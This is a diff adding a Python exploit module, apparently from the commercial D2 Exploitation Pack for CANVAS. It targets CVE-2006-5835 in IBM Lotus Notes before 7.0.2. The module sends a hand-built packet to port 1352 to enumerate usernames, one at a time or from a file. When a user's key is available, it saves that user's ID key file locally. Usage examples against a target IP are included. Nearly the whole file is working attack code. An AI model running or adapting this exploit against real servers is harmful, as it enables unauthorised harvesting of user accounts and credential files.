@@ -1,0 +1,201 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import struct
+import time
+import re
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import canvasengine
+
+# GUI info
+NAME = "IBM Lotus Notes User.ID File Key Information Disclosure Vulnerability"
+
+DESCRIPTION = "IBM Lotus Notes User.ID File Key Information Disclosure"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2006.11.08"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/20960"
+DOCUMENTATION["Versions Affected"] = "IBM Lotus Notes < 7.0.2"
+DOCUMENTATION["CVE Name"] = "CVE-2006-5835"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5835"
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"], ["Linux"], ["AIX"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+Example: 
+-- Check the existence of one user name --
+d2sec_notes_userid.py -t 192.168.1.1 -O multiuser:0 -O username:"Admin Admin"
+
+-- Check the existence of user names from a file --
+d2sec_notes_userid.py -t 192.168.1.1 -O multiuser:1 -O filename:"C:\usernames.txt"
+
+The default users file name usernames.txt is in the d2sec_notes_userid directory.
+All fetched Notes ID are saved in d2sec_notes_userid directory.
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "All" ],
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.username = ""
+        self.filename = ""
+        self.multiuser = 1       
+        self.port = 1352
+        self.version = 0        
+        return
+        
+    def getargs(self):
+	self.host = self.target.interface
+	self.username = self.argsDict.get("username", self.username)
+	self.filename = self.argsDict.get("filename", self.filename)
+	self.multiuser = int(self.argsDict.get("multiuser", self.multiuser))
+
+    def checkuser(self, username):
+    	self.log("\n")
+    	self.log("Testing user: <%s>\n" % username)
+    	
+	buff = ""
+	recv_buff = ""
+	
+	timeout = 2
+	
+	s = self.gettcpsock()
+        s.connect((self.host, self.port))
+	
+	packet =  "\x3a\x00\x00\x00\x2f\x00\x00\x00\x02\x00\x00\x40\x02\x0f\x00\x01\x00\x3d\x25\x00"
+	packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x00\x00\x00\x00\x00\x00\x00\x00"
+	packet += "\x00\x40\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+	packet += "\x28\x00\x00\x00\x1e\x00\x00\x00\x01\x00\x00\x80\x00\x00\x07\x27\x00\x00\xc4\x00"
+	packet += "\x04\x02\x00\x00\x2b\x41\x6b\x00\x28\x1f\x1e\x00\x00\x00\x10\xfe\x00\x00\x00\x00"
+	packet += "\x00\x00"
+	packet += chr(len(username) + 0x2d)
+	packet += "\x00\x01\x00"
+	packet += chr(len(username) + 0x23)
+	packet += "\x00\x0a\x00\x4f\x00\x01\x00\x00\x05\x00\x00\x09\x00"
+	packet += chr(len(username) + 1)
+	packet += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+	packet += "($Users)\x00+" + username + "\x00"
+	
+	s.send(packet)
+	
+	begin = time.time()
+	s.setblocking(0)
+	
+	while 1:
+		# Got data then break after wait sec
+		if (buff and ((time.time() - begin) > timeout)):
+			break
+	
+		# Got no data at all wait a bit more
+		elif ((time.time() - begin) > timeout*2):
+			break
+	
+		try:
+			recv_buff = s.recv(8192)
+			if recv_buff:
+				buff += recv_buff
+				begin = time.time()
+			else:
+				time.sleep(0.1)
+		except:
+			pass
+	
+	s.close()
+	
+	if re.search('\x00\x4f\x00.\x00\x18', buff):
+		self.log("  User <%s> does not exist\n" % (username))
+	  
+	elif re.search('\x00\x4f\x00.\x00\x19', buff):
+		self.log("  User <%s> exists but key not available\n" % (username))
+	  
+	elif re.search('\x00\x4f\x00.\x00\x45', buff):
+		self.log("  Multiple hits on %s\n" % (username))
+	  
+	elif re.search('\x00\x00.\x01\x00\x00\x00\x00\x01......', buff):
+		self.log("  User <%s> exists and key available\n" % (username))
+		m = re.search('[\x01\x05]\x00[\x00\x01]\x00\x2E\x01\x00\x00..\x00\x00.*', buff)
+		newname = re.sub(' ', '_', username)
+		userid = buff[m.start():]
+		idfile = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_notes_userid/" + newname + ".id"
+		file(idfile, "wb").write(userid)
+		self.log("  Key saved: %s\n" % (idfile))    	    	    	
+    	
+	return
+    	
+    def run(self):
+	self.setInfo("%s (in progress)"%(NAME))
+	self.getargs()
+	self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        # Test only one user from command line
+        if (not self.multiuser):        	
+		if (self.username == ""):
+			self.log("Error: empty user name\n")
+		else:
+			self.checkuser(self.username)
+			
+	# Test multiple users from a file
+	else:
+		if (self.filename == ""):
+			try:
+				f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_notes_userid/usernames.txt", "r")
+				usernames = f.readlines()
+				f.close()
+			except:
+				self.log("Error: cannot open file %s\n" % (os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_notes_userid/usernames.txt"))
+				return
+			
+		else:
+			try:
+				f = open(self.filename, "r")
+				usernames = f.readlines()
+				f.close()
+			except:
+				self.log("Error: cannot open file %s\n" % self.filename)
+				return
+
+		for theuser in usernames:	
+			if (theuser[len(theuser) - 1] == '\n'):
+				self.checkuser(theuser[:-1])
+			else:
+	  			self.checkuser(theuser)
+    	
+    def usage(self):        
+        print "Usage: %s -t host [-O username:name] [-O multiuser:0|1] [-O filename:name]\n" % sys.argv[0]        
+        print NOTES
+        sys.exit(0) 
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
